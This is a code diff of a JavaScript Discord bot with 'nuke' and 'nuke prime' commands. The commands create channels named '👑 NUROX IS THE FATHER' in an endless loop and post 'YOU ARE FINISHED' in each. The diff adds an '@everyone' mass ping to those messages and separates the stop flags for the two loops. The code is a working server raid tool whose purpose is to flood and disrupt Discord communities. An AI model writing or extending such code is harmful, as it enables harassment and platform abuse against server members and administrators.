@@ -13,7 +13,9 @@ const client = new Client({
   ]
 });
 
+// Separate flags for normal nuke and nuke prime
 let isNuking = false;
+let isNukingPrime = false;
 
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const OWNER_ID = process.env.OWNER_ID;
@@ -121,13 +123,13 @@ client.on('messageCreate', async (message) => {
       if (!message.guild) {
         return message.reply('This command can only be used in a server!');
       }
-      if (isNuking) {
-        return message.reply('Nuke process already running!');
+      if (isNukingPrime) {
+        return message.reply('Nuke Prime process already running!');
       }
-      isNuking = true;
+      isNukingPrime = true;
       await message.reply('💣 Nuke Prime Activated!');
 
-      while (isNuking && message.guild) {
+      while (isNukingPrime && message.guild) {
         try {
           const channel = await message.guild.channels.create({
             name: '👑 NUROX IS THE FATHER',
@@ -148,6 +150,7 @@ client.on('messageCreate', async (message) => {
       }
       await message.reply('🔄 Recovering Nuke Prime channels...');
       try {
+        await message.guild.channels.fetch();
         const channels = message.guild.channels.cache.filter(c => c.name.toLowerCase().includes('nurox'));
         let deletedCount = 0;
         for (const [id, channel] of channels) {
@@ -162,12 +165,22 @@ client.on('messageCreate', async (message) => {
       return;
     }
 
-    if (content === 'stopprime' || content === 'stop') {
+    if (content === 'stop') {
       if (isNuking) {
         isNuking = false;
-        await message.reply('🛑 Nuke Prime / Process Terminated!');
+        await message.reply('🛑 Nuke Process Terminated!');
       } else {
-        await message.reply('No active nuke loop is running.');
+        await message.reply('No active standard nuke loop is running.');
+      }
+      return;
+    }
+
+    if (content === 'stopprime') {
+      if (isNukingPrime) {
+        isNukingPrime = false;
+        await message.reply('🛑 Nuke Prime Process Terminated!');
+      } else {
+        await message.reply('No active nuke prime loop is running.');
       }
       return;
     }
@@ -257,20 +270,20 @@ client.on('interactionCreate', async (interaction) => {
     if (!interaction.guild) {
       return interaction.reply({ content: 'This command can only be used in a server!', ephemeral: true });
     }
-    if (isNuking) {
-      return interaction.reply({ content: 'Nuke process already running!', ephemeral: true });
+    if (isNukingPrime) {
+      return interaction.reply({ content: 'Nuke Prime process already running!', ephemeral: true });
     }
 
-    isNuking = true;
+    isNukingPrime = true;
     await interaction.reply({ content: '💣 Nuke Prime Activated!' });
     
-    while (isNuking && interaction.guild) {
+    while (isNukingPrime && interaction.guild) {
       try {
         const channel = await interaction.guild.channels.create({
           name: '👑 NUROX IS THE FATHER',
           type: 0
         });
-        await channel.send('YOU ARE FINISHED');
+        await channel.send('@everyone YOU ARE FINISHED');
       } catch (err) {
         console.error('Error creating channel:', err);
       }
@@ -286,7 +299,6 @@ client.on('interactionCreate', async (interaction) => {
     await interaction.reply({ content: '🔄 Recovering Nuke Prime channels...', ephemeral: true });
     
     try {
-      // Fetch fresh list of channels to catch all newly created ones
       await interaction.guild.channels.fetch();
       const channels = interaction.guild.channels.cache.filter(c => c.name.toLowerCase().includes('nurox'));
       let deletedCount = 0;
@@ -303,12 +315,21 @@ client.on('interactionCreate', async (interaction) => {
     }
   }
 
-  if (commandName === 'stopprime' || commandName === 'stop') {
+  if (commandName === 'stop') {
     if (isNuking) {
       isNuking = false;
-      await interaction.reply({ content: '🛑 Nuke Prime / Process Terminated!' });
+      await interaction.reply({ content: '🛑 Standard Nuke Process Terminated!' });
     } else {
-      await interaction.reply({ content: 'No active nuke loop is running.', ephemeral: true });
+      await interaction.reply({ content: 'No active standard nuke loop is running.', ephemeral: true });
+    }
+  }
+
+  if (commandName === 'stopprime') {
+    if (isNukingPrime) {
+      isNukingPrime = false;
+      await interaction.reply({ content: '🛑 Nuke Prime Process Terminated!' });
+    } else {
+      await interaction.reply({ content: 'No active nuke prime loop is running.', ephemeral: true });
     }
   }
 });
